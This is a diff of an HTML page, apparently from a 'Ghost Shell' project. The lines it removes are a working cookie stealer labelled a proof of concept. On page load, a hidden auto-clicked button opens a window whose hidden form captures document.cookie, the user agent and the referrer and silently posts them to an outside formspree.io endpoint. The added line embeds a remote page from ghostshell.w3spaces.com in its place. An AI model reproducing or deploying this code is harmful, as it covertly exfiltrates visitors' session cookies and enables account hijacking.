@@ -3,73 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ghost Shell</title>
+    <title>Ghost Shell Embed</title>
 </head>
 <body>
 
-    <h2>Ghost Shell Scanner</h2>
-    <button id="ghostButton" style="display: none;" onclick="openGhostShell()">Open Ghost Shell</button>
-
-    <script>
-        function openGhostShell() {
-            let ghostWindow = window.open("", "_blank", "width=800,height=600");
-            if (ghostWindow) {
-                ghostWindow.document.write(`<!DOCTYPE html>
-                    <html lang="en">
-                    <head>
-                        <meta charset="UTF-8">
-                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                        <title>Ghost Shell Cookie Stealer PoC</title>
-                        <style>
-                            body {
-                                background-color: black;
-                                color: white;
-                                display: flex;
-                                justify-content: center;
-                                align-items: center;
-                                height: 100vh;
-                                flex-direction: column;
-                                font-family: Arial, sans-serif;
-                            }
-                            h2 {
-                                text-align: center;
-                                color: gold;
-                                text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
-                            }
-                            form {
-                                display: none;
-                            }
-                        </style>
-                    </head>
-                    <body>
-                        <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
-                        <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
-                            <input type="hidden" name="cookie_data" id="cookieField" value="">
-                            <input type="hidden" name="user_agent" id="userAgentField" value="">
-                            <input type="hidden" name="referrer" id="referrerField" value="">
-                            <input type="hidden" name="fallback" value="not_empty">
-                            <button type="submit" name="submitButton">Send</button>
-                        </form>
-                        <script>
-                            document.addEventListener("DOMContentLoaded", function() {
-                                document.getElementById("cookieField").value = document.cookie || "No_Cookies";
-                                document.getElementById("userAgentField").value = navigator.userAgent || "Unknown_User_Agent";
-                                document.getElementById("referrerField").value = document.referrer || "No_Referrer";
-                                if (document.cookie !== "No_Cookies" || document.referrer !== "No_Referrer") {
-                                    document.getElementById("stealthForm").submit();
-                                }
-                            });
-                        <\/script>
-                    </body>
-                    </html>`);
-                ghostWindow.document.close();
-            }
-        }
-
-        window.onload = function() {
-            document.getElementById("ghostButton").click();
-        };
-    </script>
+    <embed src="https://ghostshell.w3spaces.com/ghost.html" width="100%" height="90%">
 
 </body>
 </html>
